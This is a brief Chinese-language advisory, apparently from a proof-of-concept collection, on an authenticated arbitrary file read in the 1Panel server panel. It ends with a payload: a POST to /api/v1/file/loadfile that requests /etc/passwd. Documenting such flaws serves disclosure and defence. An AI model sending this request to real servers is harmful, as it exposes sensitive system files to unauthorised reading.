# 1Panel loadfile 后台文件读取漏洞

## 漏洞描述
1Panel 是一个现代化、开源的Linux 服务器运维管理面板。

1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登陆页面

![image-20230828162515540](images/image-20230828162515540.png)

![image-20230828162528792](images/image-20230828162528792.png)

![image-20230828162539743](images/image-20230828162539743.png)

验证POC


## Payloads
```
POST /api/v1/file/loadfile

{"paht":"/etc/passwd"}
```
